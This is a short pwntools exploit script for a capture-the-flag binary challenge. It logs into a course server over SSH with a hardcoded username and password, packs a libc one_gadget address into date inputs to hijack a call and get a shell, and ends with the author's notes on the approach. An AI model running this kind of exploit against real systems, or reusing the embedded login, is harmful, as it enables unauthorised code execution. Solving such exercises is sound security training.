from pwn import *
from sys import *

SERVER = "bin.chall.necst.it"
PORT = 22
BINARY = "mission3"
REMOTE_BINARY = "/home/m226002/"+BINARY+"/"+BINARY
PASSWORD = "unixporn"
USER  = "m226002"


if "--remote" in sys.argv:
    s = ssh(user=USER, host=SERVER, port=PORT, password=PASSWORD)
    r = s.process(REMOTE_BINARY)
else:
    r = process(BINARY)

if "--debug" in sys.argv:
     
    gdb.attach(r, """
        #breakpoints
        b* 080488ea
        c
        """)
    input("wait")


def extract_date_values(address):
    day = (address >> 24) & 0xFF  
    month = (address >> 16) & 0xFF  
    year = (address >> 0) & 0xFFFF 

    return month, year, day


onegadget = 0xf7e14000+0x3ac6c

month, year, day = extract_date_values(onegadget)

print(year, month, day)

day_byte = str(day).encode()
month_byte = str(month).encode()
year_bytes = str(year).encode()

r.sendline(year_bytes)
r.sendline(month_byte)
r.sendline(day_byte)

r.sendline(b"flag\n") #for the exploit this is useless

r.interactive()

#I don't think I have resolved the challenge I was supposed to but still working

# Anyway, this challenge present a special type of call where with a combination of 
# the three integers (year, day, month) it ends up to craft a jump addr. In addition 
# you can use the "last word" buffer to pass an argument to the call. 

# What I've done was completely different. Because of my knowledge from ODCS and because
# with vmmap I saw the only code executable was libc (ofcourse also .text), I downloaded 
# the libc from the server and I looked for a onegadget. Then I just call it. 
# To help me, I wrote a function that permits me to have the exact addr in the call instruction
